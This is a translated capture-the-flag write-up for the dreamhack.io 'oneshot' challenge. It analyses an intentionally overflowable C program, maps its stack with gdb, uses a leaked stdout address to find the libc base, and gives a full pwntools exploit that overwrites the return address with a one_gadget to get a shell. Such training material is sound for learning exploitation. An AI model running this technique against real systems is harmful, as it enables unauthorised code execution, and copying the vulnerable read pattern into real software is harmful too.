# dreamhack.io: oneshot

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224286691938). Translated and reformatted in English.

Source code analysis

int main(int argc, char *argv[]) {
 char msg[16];
 size_t check = 0;
 initialize();

 printf("stdout: %p\n", stdout); // [1] stdout address leak

 printf("MSG: ");
 read(0, msg, 46); // [2] Input 46 bytes into a 16-byte buffer → BOF

 if(check > 0) { // [3] check must be 0 to continue
 exit(0);
 }
 printf("MSG: %s\n", msg);
 return 0; // [4] Jump to RET address when returning
}

vulnerability

msg is 16 bytes, but read() takes up to 46 bytes, so input of more than 30 bytes is possible. Since there are no canaries, the stack can be covered as is.

Stack Layout Analysis

Check the actual variable address with gdb.

$ gdb ./oneshot
(gdb)b main
(gdb)r
(gdb) p &msg # msg starting address
(gdb) p &check # check start address

Actual stack structure (compiler inserts 8 bytes of padding for alignment):

[low address]
rbp-0x20 msg[16] ← Input starting point
rbp-0x10 (8 bytes of padding) ← Compiler inserts for 16-byte alignment
rbp-0x08 check (8 bytes) ← Must be 0 to avoid branching to exit()
rbp+0x00 SFP (8 bytes) ← Stored frame pointer
rbp+0x08 RET (8 bytes) ← Target to cover
[high address]

Note: In the code it looks like check right after msg[16], but in real memory the compiler inserts 8 bytes of padding. It's easy to miss the presence of padding unless you check it yourself with gdb.

Exploit Strategy

Step 1 — libc address leak

The program directly outputs the stdout address.

stdout: 0x7f3a001ec620

This value calculates where libc is loaded in memory.

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]

Step 2 — Calculate one_gadget address

one_gadget is a piece of code that executes /bin/sh by simply jumping to a single address in the libc file.

$ one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
0x4526a execve("/bin/sh", rsp+0x30, environ)
0xf03a4 execve("/bin/sh", rsp+0x50, environ)

Since it is a fixed offset in the libc file, if you know libc_base, you can calculate the actual address.

one_gadget = libc_base + 0x4526a # Select candidates that meet the conditions

Step 3 — Configure payload

[msg 16 bytes] + [padding 8 bytes] + [check 8 bytes, with \x00] + [SFP 8 bytes] + [RET = one_gadget]

payload = b'A' * 24 # msg(16) + compiler padding(8)
payload += b'\x00' * 8 # keep check = 0 (prevent exit)
payload += b'B' * 8 # Cover SFP
payload += p64(one_gadget) # RET → one_gadget

Reason for filling check with \*00: If the if(check > 0) condition is met, it exits with exit(0), so the check area must remain at 0.

Final exploit code

from pwn import *

def slog(name, addr):
 return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 23231)
e = ELF("./oneshot")
libc = ELF("./libc.so.6")

one_gadget_offset = 0x4526a # offset found with one_gadget tool

# [1] libc leak
p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = libc_base + one_gadget_offset

slog("stdout", stdout)
slog("libc_base", libc_base)
slog("one_gadget", one_gadget)

# [2] payload
payload = b'A' * 24 # msg(16) + padding(8)
payload += b'\x00' * 8 # keep check = 0
payload += b'B' * 8 # SFP
payload += p64(one_gadget) # Cover RET

p.sendafter(b"MSG: ", payload)
p.interactive()

Summary of key concepts

one_gadget: A code fragment inside libc that executes /bin/sh by simply jumping to a single address. However, it only works if the register/stack status at the time of execution satisfies the conditions.

libc leak: Since the address changes every execution in the PIE/ASLR environment, a technique to invert libc_base using the libc internal symbol address output by the program.

Compiler-aligned padding: The compiler may insert empty space that is not present in the code to align stack variables to 16-byte boundaries. It is important to have the habit of checking the actual address with gdb.
